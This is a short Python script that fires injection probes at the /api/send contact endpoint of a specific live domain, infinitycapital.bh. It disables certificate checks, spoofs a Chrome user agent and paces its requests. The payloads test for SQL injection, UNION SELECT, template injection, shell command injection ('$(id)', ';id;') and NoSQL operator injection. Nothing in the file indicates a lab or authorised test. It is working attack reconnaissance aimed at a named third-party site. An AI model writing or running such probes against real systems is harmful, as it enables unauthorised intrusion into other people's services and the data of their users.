import hashlib, json, ssl, urllib.request, urllib.error, time

BASE = "https://www.infinitycapital.bh"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125 Safari/537.36"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def post(path, data, hdrs=None, ctype="application/json"):
    body = data.encode() if isinstance(data, str) else json.dumps(data).encode()
    h = {"User-Agent": UA, "Content-Type": ctype, "Accept": "*/*"}
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(BASE + path, data=body, headers=h, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=25, context=ctx)
        b = r.read()
        return r.status, dict(r.headers), b
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return "ERR", {}, str(e).encode()

def show(tag, path, data, hdrs=None, ctype="application/json"):
    s, h, b = post(path, data, hdrs, ctype)
    txt = b[:400].decode("utf-8", "replace").replace("\n", " ")
    print(f"[{tag}] {s} len={len(b)} md5={hashlib.md5(b).hexdigest()[:10]} | {txt}")
    return s, b

print("### baseline empty")
show("empty", "/api/send", {})
time.sleep(2)
print("### shape probe")
show("str", "/api/send", {"name": "a", "email": "a@b.com", "message": "hello"})
time.sleep(2)
show("sqli", "/api/send", {"name": "a' OR '1'='1", "email": "a@b.com", "message": "x"})
time.sleep(2)
show("sqli2", "/api/send", {"name": "a", "email": "a@b.com", "message": "' UNION SELECT 1,2,3-- -"})
time.sleep(2)
show("ssti", "/api/send", {"name": "{{7*7}}", "email": "a@b.com", "message": "${7*7}"})
time.sleep(2)
show("cmdi", "/api/send", {"name": ";id;", "email": "a@b.com", "message": "$(id)"})
time.sleep(2)
show("nosqli", "/api/send", {"name": {"$ne": "x"}, "email": "a@b.com", "message": "m"})
time.sleep(2)
show("form", "/api/send", "name=a%40b.com&email=a%40b.com&message=hi", ctype="application/x-www-form-urlencoded")
